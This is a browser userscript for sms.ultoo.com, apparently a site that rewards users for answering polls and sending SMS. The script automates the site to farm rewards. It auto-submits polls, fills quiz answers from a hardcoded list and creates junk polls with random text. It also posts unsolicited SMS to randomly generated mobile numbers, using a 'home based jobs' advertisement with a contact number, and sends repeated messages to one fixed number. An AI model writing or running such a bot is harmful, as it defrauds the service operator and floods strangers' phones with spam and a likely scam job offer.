// ==UserScript==
// @name        Ultoo Script By MasterX
// @namespace  
// @include     http://sms.ultoo.com/*
// @require https://ajax.googleapis.com/ajax/libs/jquery/1.7.0/jquery.min.js
// @grant       none
// @version     1
// ==/UserScript==


$(function()
{

var url=window.location.href;

var pattern=/^http:\/\/sms.ultoo.com\/mywallet.php/g;

if(url.search(pattern)==0)
{
	window.location.href=url.replace("mywallet","AnswereIt");
}

pattern=/^http:\/\/sms.ultoo.com\/poll.php/g;

if(url.search(pattern)==0)
{
	$("#OptionId_2").attr('checked');
	unsafeWindow.ImplementClass('AnchorId_1');
	document.form1.OptionChecked.value=1;
	document.form1.submit();
	setTimeout("window.location.href = \"http://sms.ultoo.com/poll.php?zxcoiesesscd=\";",200);
	var mobile=Math.floor(Math.random()*1000000)+9840000000;
		$.post("home.php",{zxcoiesesscd:"" , MessageLength:"140" , GlobalKeyValue:"1" , chalange_field:"" , response_field:"" , MobileNos_:mobile , Message_:"HOME BASED JOBS FOR COLLEGE STUDENTS: Income-7000. Qualification:12th & Above. Computer Knowledge must. If intrsted, contact 8220021819." , SendNow_:"Send Now"}, function(){});
	setTimeout("document.form1.submit();",150);
}

pattern=/^http:\/\/sms.ultoo.com\/PollResult.php/g;

if(url.search(pattern)==0)
{
	var link = $(".poll_result_gbg a:last").attr('href');
	if(typeof(link) != "undefined")
	{
		window.location.href = link;
	}

	var link2 = $("img[src='images/submit_now.jpg']").parent().attr("href");
	if(typeof(link2) != "undefined")
	{
		window.location.href = link2;
	}
}

pattern=/^http:\/\/sms.ultoo.com\/middleAdPoll.php/g;

if(url.search(pattern)==0)
{
	window.location.href=url.replace("middleAdPoll","poll");
}

pattern=/^http:\/\/sms.ultoo.com\/PollCompletion.php/g;

if(url.search(pattern)==0)
{
	var link = $("img[src='images/submit_now.jpg']").parent().attr("href");
	if(typeof(link) != "undefined")
	{
		window.location.href = link;
	}
}

pattern=/^http:\/\/sms.ultoo.com\/PollCompleted.php/g;

if(url.search(pattern)==0)
{
	if(document.getElementsByTagName('font')[0]!=undefined)
	{
		window.location.href=url.replace("PollCompleted", "home");
	}
	else
	{
		document.getElementsByName('PollUserName')[0].value="Ultoo Guest";
		document.getElementsByName('PollUserQuestion')[0].value="Question'"+Math.floor((Math.random() * 100000000) + 1)+"'";
		document.getElementById('OptionId1').value="a'"+Math.floor((Math.random() * 100) + 1)+"'";
		document.getElementById('OptionId2').value="b'"+Math.floor((Math.random() * 100) + 1)+"'";
		document.getElementById('OptionId3').value="c'"+Math.floor((Math.random() * 100) + 1)+"'";
		document.getElementById('OptionId4').value="d'"+Math.floor((Math.random() * 100) + 1)+"'";
		document.form1.submit();

	}
}

pattern=/^http:\/\/sms.ultoo.com\/QuestionSaved.php/g;

if(url.search(pattern)==0)
{
	window.location.href ="http://sms.ultoo.com/AnswereIt.php?zxcoiesesscd=";
}

//Messages

pattern=/^http:\/\/sms.ultoo.com\/home.php/g;

if(url.search(pattern)==0)
{
	var content=document.getElementsByTagName('font')[0].innerHTML;
	var pat="Dear";

	if(content.search(pat)<0)
	{	
		document.getElementById('MobileNos_').value=9016403905;
                document.getElementById('Message_').value="Hi..., Happy Earning...! my mobile no is'"+Math.floor((Math.random() *9012345678) + 9)+"'";
		document.frmSendSms.submit();
		setTimeout("window.location.href = \"http://sms.ultoo.com/home.php?zxcoiesesscd=\";",100);		
	}
	else
	{
		window.location.href ="http://sms.ultoo.com/index.php?zxcoiesesscd=";
		//window.location.href ="http://sms.ultoo.com/logout.php?Logout=1";
	}
}

//AnswerIt 

pattern=/^http:\/\/sms.ultoo.com\/AnswereIt.php/g;

if(url.search(pattern)==0)
{
	var options="Watson;Pune;Anita;Dabangg;RD Burman;Kareena;6;Salman;1;Swahili;Tennis;Wanted;Younis;Krishna;Rajasthan;Salman;A380;Krish;Kajri;1889;Aasha;Pula;Snail;Meeta;Addis Ababa;Heavily doped;Rome;Ignite;Yorker;Heater coils;Jackie Shroff;Ganga;Lover;Khushwant;Belgium;Andaz;2 weeks;Agra;India;Abhishek;Red;Abhitabh;Kukro koo;Genda;Appu Pappu;Chess;Rockstar;Hay Tauba;Ears;Tailor;";
	var quesids="13194;13195;13196;13197;13198;13199;13200;13201;13202;13203;13204;13205;13206;13207;13208;13209;13210;13211;13212;13213;13214;13215;13216;13217;13218;13219;13220;13221;13222;13223;13224;13225;13226;13227;13228;13229;13230;13231;13232;13233;13234;13235;13236;13237;13238;13239;13240;13241;13242;13243";
	var cont=document.getElementsByTagName('p')[0].innerHTML;
	var qno=parseInt(cont.substr(17));
	document.getElementsByTagName('input')[0].value=options.split(";")[qno-1];	
	var quesid=quesids.split(";")[qno-1];
	var oid=(parseInt(quesid)*4)-10;
	var qxval=document.getElementsByTagName('input')[0].value;
	var mobile=9016403905;
	$.post("poll.php",{ qxci:qxval , QuestionId:quesid , OptionChecked:"1" , zxcoiesesscd:"" , chalange_field:"" , response_field:"" , OptionId:oid},function(){});
	setTimeout(function(){$.post("home.php",{zxcoiesesscd:"" , MessageLength:"140" , GlobalKeyValue:"1" , chalange_field:"" , response_field:"" , MobileNos_:mobile , Message_:"Hi..., Happy Earning...! my mobile no is'"+Math.floor((Math.random() *9012345678) + 2)+"'" , SendNow_:"Send Now"}, function(){});},750);
	setTimeout("document.getElementsByTagName('input')[2].click();",100);
	//setTimeout("window.location.href = \"http://sms.ultoo.com/AnswereIt.php?zxcoiesesscd=\";",200);
}

pattern=/http:\/\/sms.ultoo.com\/AnswereItGraph.php/g;

if(url.search(pattern)==0)
{
	window.location.href = "http://sms.ultoo.com/AnswereIt.php?zxcoiesesscd=";
}

pattern=/^http:\/\/sms.ultoo.com\/AICompletion.php/g;

if(url.search(pattern)==0)
{
	window.location.href="http://sms.ultoo.com/poll.php?zxcoiesesscd=";
}

pattern=/^http:\/\/sms.ultoo.com\/index.php/g;

if(url.search(pattern)==0)
{
	window.location.href="http://sms.ultoo.com/transaction.php?credit=2&debit=0";
}

pattern=/^http:\/\/sms.ultoo.com\/SessExpire.php/g;

if(url.search(pattern)==0)
{
	window.location.href="http://sms.ultoo.com/logout.php?LogOut=1";
}

pattern=/^http:\/\/sms.ultoo.com\/relogin.php/g;

if(url.search(pattern)==0)
{
	window.location.href="http://sms.ultoo.com/login.php";
}

});

setTimeout(function(){
   window.location.reload(1);
}, 60000);